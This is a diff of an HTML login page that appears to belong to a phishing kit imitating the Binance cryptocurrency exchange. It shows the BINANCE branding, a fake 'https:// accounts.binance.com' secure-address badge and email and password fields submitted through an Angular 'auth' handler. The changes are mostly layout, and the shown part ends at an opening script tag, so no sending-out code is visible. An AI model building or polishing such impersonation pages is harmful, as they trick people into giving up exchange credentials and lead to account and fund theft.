@@ -11,48 +11,51 @@
 </head>
 <body ng-app="App" ng-controller="Controller" class="col">
 
-<header class="row align-start-center block-top">
+<header class="row align-start-center">
     <img src="/stock/img/dollar.svg" class="header-logo">
     <a href="#" class="header-logo-text">BINANCE</a>
 </header>
 
-<form class="white-content col" ng-submit="auth($event)" style="width: 400px">
-    <div class="col  align-start-center">
-        <h1 style="margin-bottom: 12px;">Log In</h1>
-        <div class="size12 gray" style="margin-bottom: 12px;">Please check that you are visiting the correct URL</div>
-        <div class="secure-message row align-center-center">
-            <img src="img/secure.svg">
-            <div class="row size12">
-                <div class="green">https://</div>
-                <div>accounts.binance.com</div>
+<div class="col align-start-center">
+    <form class="block col" ng-submit="auth($event)" style="width: 384px;">
+        <div class="col align-start-center">
+            <h1 style="margin-bottom: 12px;">Log In</h1>
+            <div class="size12 gray" style="margin-bottom: 12px;">Please check that you are visiting the correct URL
+            </div>
+            <div class="secure-message row align-center-center">
+                <img src="img/secure.svg">
+                <div class="row size12">
+                    <div class="green">https://</div>
+                    <div>accounts.binance.com</div>
+                </div>
             </div>
         </div>
-    </div>
 
 
-    <div class="col align-start input-block">
-        <div class="row" style="border-bottom: 1px solid rgb(234, 236, 239);">
-            <div class="block-title-active">Email</div>
-            <div class="block-title">Mobile</div>
-        </div>
+        <div class="col align-start input-block">
+            <div class="row" style="border-bottom: 1px solid rgb(234, 236, 239);">
+                <div class="block-title-active">Email</div>
+                <div class="block-title">Mobile</div>
+            </div>
 
-        <div class="col">
-            <div class="size12 gray">Email</div>
-            <input type="text" ng-model="login" required>
-        </div>
+            <div class="col">
+                <div class="size12 gray">Email</div>
+                <input type="text" ng-model="login" required>
+            </div>
 
-        <div class="col">
-            <div class="size12 gray">Password</div>
-            <input type="text" ng-model="password" required>
+            <div class="col">
+                <div class="size12 gray">Password</div>
+                <input type="text" ng-model="password" required>
+            </div>
+            <button class="main-button" type="submit" style="margin-top: 24px;">Log In</button>
+            <div class="row">
+                <a href="#" class="size12 flex underline">Forgot Password?</a>
+                <a href="#" class="size12 orange-black underline" style="margin-right: 14px;">Scan to login</a>
+                <a href="#" class="size12 orange-black underline">Free registration</a>
+            </div>
         </div>
-        <button class="main-button" type="submit"  style="margin-top: 24px;">Log In</button>
-        <div class="row">
-            <a href="#" class="size12 flex underline hover-orange">Forgot Password?</a>
-            <a href="#" class="size12 orange-black hover-orange " style="margin-right: 14px;">Scan to login</a>
-            <a href="#" class="size12 orange-black hover-orange ">Free registration</a>
-        </div>
-    </div>
-</form>
+    </form>
+</div>
 
 
 <script>
